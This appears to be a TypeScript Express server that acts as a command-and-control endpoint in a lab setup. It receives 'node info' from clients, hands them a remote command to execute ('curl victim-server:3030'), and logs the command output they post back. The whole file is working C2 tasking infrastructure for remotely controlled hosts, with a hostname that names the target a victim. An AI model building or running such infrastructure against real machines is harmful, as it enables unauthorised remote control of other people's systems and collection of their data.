import express from "express";
import { json } from "body-parser";
import { CommandPayloadDTO } from "./types";
import { argv } from "bun";

// const REMOTE_COMMAND = "curl localhost:3030"
const REMOTE_COMMAND = "curl victim-server:3030" // for testing in docker compose
const PORT = +argv[2] || 7789 

const app = express();

app.use(json());

// Posts node info
app.post("/api/tools/seoul/node-info", (req, res) => {
  console.log("Node Info:", req.body);
  res.status(200).send("Node Info received");
});

// Client gets command
app.get("/api/tools/seoul/remote-command", (req, res) => {

  const cmdInput: CommandPayloadDTO = {
    command: REMOTE_COMMAND,
    respondWithData: true,
  }
  
  const cmdPayload: CommandPayloadDTO = new CommandPayloadDTO(cmdInput);
  res.status(200).send(cmdPayload);
});

// Client posts output to this endpoint
app.post("/api/tools/seoul/remote-command", (req, res) => {
  console.log("Remotely Executed Command:", req.body);
  res.status(200).send("Command Output received");
});

function runServer() {
  app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
  });
}

runServer()